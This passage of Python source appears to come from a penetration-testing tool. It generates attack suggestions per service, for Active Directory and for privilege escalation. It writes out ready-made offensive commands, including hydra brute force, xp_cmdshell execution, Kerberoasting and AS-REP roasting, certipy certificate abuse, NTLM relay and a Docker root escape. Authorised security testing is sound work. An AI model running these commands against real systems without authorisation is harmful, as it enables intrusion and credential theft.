            description="SMTP VRFY/EXPN/RCPT can enumerate valid users",
            confidence="medium", score=50,
            evidence=[f"SMTP on port {port}"],
            exploit_suggestions=[
                f"smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {target}",
                f"nc {target} {port} → VRFY username",
                "Use RCPT TO for user enumeration if VRFY disabled",
            ],
        ))

    # Telnet
    if "telnet" in service.lower() or port == 23:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="telnet",
            target=f"{target}:{port}",
            title="Telnet — Cleartext Protocol",
            description="Telnet transmits credentials in cleartext and may have weak auth",
            confidence="high", score=60,
            evidence=[f"Telnet on port {port}"],
            exploit_suggestions=[
                "Brute force: hydra -L users.txt -P rockyou.txt telnet://target",
                "Sniff credentials if on local network (ettercap, bettercap)",
                "Check for default/weak credentials",
            ],
        ))

    # MSSQL
    if "mssql" in service.lower() or port == 1433:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="mssql",
            target=f"{target}:{port}",
            title="MS SQL Server",
            description="MS SQL may allow xp_cmdshell execution or data extraction",
            confidence="high", score=65,
            evidence=[f"MSSQL on port {port}"],
            exploit_suggestions=[
                f"sqsh -S {target} -U sa -P ''  # empty password check",
                f"crackmapexec mssql {target} -u sa -p ''",
                "If access: EXEC xp_cmdshell 'whoami'",
                "Metasploit: auxiliary/admin/mssql/mssql_exec",
            ],
        ))

    # Oracle TNS
    if port == 1521:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="oracle_tns",
            target=f"{target}:{port}",
            title="Oracle TNS Listener",
            description="Oracle database may have default creds or TNS poisoning",
            confidence="medium", score=55,
            evidence=[f"Oracle TNS on port {port}"],
            exploit_suggestions=[
                f"tnscmd10g status -h {target}",
                "Try default SIDs: ORCL, XE, XDB",
                "oscanner -s {target}",
                "Metasploit: auxiliary/admin/oracle/post_exploitation/win32exec",
            ],
        ))

    # SIP
    if "sip" in service.lower() or port == 5060:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="sip",
            target=f"{target}:{port}",
            title="SIP — VoIP Enumeration",
            description="SIP service may allow user enumeration and call interception",
            confidence="medium", score=45,
            evidence=[f"SIP on port {port}"],
            exploit_suggestions=[
                f"svmap {target}",
                f"svwar -m INVITE -e100-200 {target}",
            ],
        ))

    return vectors


def vectors_for_ad(domain_info: dict, host_ip: str) -> List[AttackVector]:
    """Generate AD-specific attack vectors based on enumeration results."""
    vectors = []
    domain_name = domain_info.get("name", "")
    users = domain_info.get("users", [])
    spns = domain_info.get("spns", [])
    cas = domain_info.get("ca_servers", [])

    # AS-REP Roasting target
    if users:
        vectors.append(generate_attack_vector(
            category="ad_attack", vector_type="asrep_roast",
            target=f"{host_ip} ({domain_name})",
            title="AS-REP Roasting",
            description=f"{len(users)} domain users discovered. Users with "
                        "'Do not require Kerberos preauthentication' can have "
                        "their AS-REP tickets roasted offline.",
            confidence="high", score=70,
            evidence=[f"{len(users)} users enumerated via LDAP/RPC"],
            exploit_suggestions=[
                f"GetNPUsers.py {domain_name}/ -usersfile users.txt "
                f"-no-pass -dc-ip {host_ip}",
                f"crackmapexec ldap {host_ip} -u users.txt -p '' --asreproast",
            ],
            prerequisites=["Username list", f"DC reachable at {host_ip}"],
        ))

    # Kerberoasting target
    if spns:
        vectors.append(generate_attack_vector(
            category="ad_attack", vector_type="kerberoast",
            target=f"{host_ip} ({domain_name})",
            title="Kerberoasting",
            description=f"{len(spns)} SPNs discovered. Service accounts with SPNs "
                        "can have their TGS tickets extracted and cracked offline.",
            confidence="high", score=75,
            evidence=[f"{len(spns)} SPNs found"],
            exploit_suggestions=[
                f"GetUserSPNs.py {domain_name}/USER:PASS -request -dc-ip {host_ip}",
                "Crack with hashcat -m 13100 hashes.txt",
            ],
            prerequisites=["Valid domain credentials"],
        ))

    # ADCS attack
    if cas:
        vectors.append(generate_attack_vector(
            category="ad_attack", vector_type="adcs_esc",
            target=f"{host_ip} ({domain_name})",
            title="ADCS Certificate Attack (ESC)",
            description=f"Certificate Authority detected: {cas}. ESC1-ESC13 "
                        "template misuse attacks may be possible.",
            confidence="high", score=80,
            evidence=[f"CA servers: {cas}"],
            exploit_suggestions=[
                f"certipy find -u USER@{domain_name} -p PASS -dc-ip {host_ip} -vulnerable",
                "Look for ESC1 (template allows SAN), ESC8 (NTLM relay to CA)",
                "certipy req -ca 'CA-NAME' -template 'VULN-TEMPLATE' -alt 'admin@domain'",
            ],
            prerequisites=["Valid domain credentials", "certipy installed"],
        ))

    # SMB signing
    vectors.append(generate_attack_vector(
        category="lateral", vector_type="smb_relay",
        target=f"{host_ip} ({domain_name})",
        title="SMB Relay Attack",
        description="If SMB signing is not required, NTLM relay attacks can "
                    "be used to authenticate as other users.",
        confidence="medium", score=55,
        evidence=["SMB service present on DC/domain host"],
        exploit_suggestions=[
            "Check signing: crackmapexec smb TARGET --gen-relay-list targets.txt",
            "nmap -p 445 --script smb-security-mode TARGET",
            "If signing not required: ntlmrelayx.py -tf targets.txt",
            "Responder + ntlmrelayx for credential capture + relay",
        ],
        prerequisites=["SMB signing not required", "Network position"],
    ))

    return vectors


def generate_privesc_vectors(
    os_type: str,
    host_ip: str,
    findings: List[str],
) -> List[AttackVector]:
    """Generate privilege escalation suggestions for a compromised host."""
    vectors = []

    if os_type == "linux":
        vectors.append(generate_attack_vector(
            category="privesc", vector_type="linux_privesc",
            target=host_ip,
            title="Linux Privilege Escalation",
            description="Standard Linux privilege escalation checks",
            confidence="medium", score=50,
            evidence=["Linux host identified"],
            exploit_suggestions=[
                "Run linpeas.sh for automated enumeration",
                "Manual: sudo -l, find / -perm -4000 2>/dev/null (SUID)",
                "Check: cat /etc/crontab, ls -la /etc/cron.*",
                "Kernel exploits: uname -r then searchsploit linux kernel VERSION",
                "Check writable paths: find / -writable -type d 2>/dev/null",
                "Docker group: docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                "PATH hijacking if writable dirs in PATH",
            ],
        ))
    elif os_type == "windows":
        vectors.append(generate_attack_vector(
            category="privesc", vector_type="windows_privesc",
            target=host_ip,
            title="Windows Privilege Escalation",
            description="Standard Windows privilege escalation checks",
            confidence="medium", score=50,
            evidence=["Windows host identified"],
            exploit_suggestions=[
                "Run winpeas.exe or Seatbelt.exe for automated enumeration",
                "Manual: whoami /priv (look for SeImpersonate, SeDebug, SeAssignPrimaryToken)",
                "SeImpersonate -> PrintSpoofer / GodPotato / RoguePotato",
                "Check: net user USERNAME, systeminfo (missing patches)",
                "Unquoted service paths: wmic service get name,displayname,pathname,startmode",
                "Check registry: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                "AlwaysInstallElevated: reg query HKCU\\...\\AlwaysInstallElevated",
            ],
        ))

    return vectors


def vectors_for_services(target: str, services: List[dict]) -> List[AttackVector]:
    """Generate attack vectors for all services on a host (plural wrapper)."""
    all_vectors = []
    for svc in services:
        port = svc.get("port", 0)
        service_name = svc.get("service", "")
        version = svc.get("version", "")
        if service_name:
            vecs = vectors_for_service(target, port, service_name, version)
            all_vectors.extend(vecs)
    return all_vectors


def vectors_for_cve(target: str, port: int, service: str, version: str, cve: dict) -> List[AttackVector]:
    """Generate an attack vector from a discovered CVE."""
    cve_id = cve.get("id", "CVE-unknown")
    cvss = cve.get("cvss_score", 0)
    severity = cve.get("severity", "UNKNOWN")
    desc = cve.get("description", "")[:120]

    confidence = "high" if cvss >= 7.0 else "medium" if cvss >= 4.0 else "low"
    score = min(95, int(cvss * 10))

    return [generate_attack_vector(
        category="initial_access", vector_type="known_cve",
        target=f"{target}:{port}",
        title=f"{cve_id} — {service} {version} ({severity})",
        description=f"{desc}",
        confidence=confidence, score=score,
        evidence=[f"{service} {version} matches {cve_id} (CVSS {cvss})"],
        exploit_suggestions=[
            f"searchsploit {cve_id}",
            f"nmap --script vuln -p {port} {target}",
            f"msfconsole -q -x 'search {cve_id}; use ...'",
        ],
        cves=[cve_id],
    )]
